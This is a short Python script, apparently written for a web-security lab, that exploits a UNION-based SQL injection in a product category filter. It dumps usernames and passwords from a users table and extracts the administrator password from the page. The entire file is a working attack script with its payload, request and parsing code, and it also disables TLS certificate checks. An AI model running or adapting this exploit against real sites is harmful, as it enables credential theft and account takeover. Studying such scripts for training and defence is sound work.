import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.01:8080', 'https': 'https://127.0.01:8080'}

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = 'filter?category=Gifts'
    sql_payload = "' UNION select NULL, username||'**'|| password from users--"
    r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
    res = r.text
    if username in res:
        print('[+] Found the administrator password...')
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(text=re.compile('.*administrator.*')).split('**')[1]
        print(f'[+] The administrator password is {admin_password}')
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('[+] Dumping the list of usernames and passwords...')
    if not exploit_sqli_users_table(url):
        print('[-] Did not find an administrator password.')


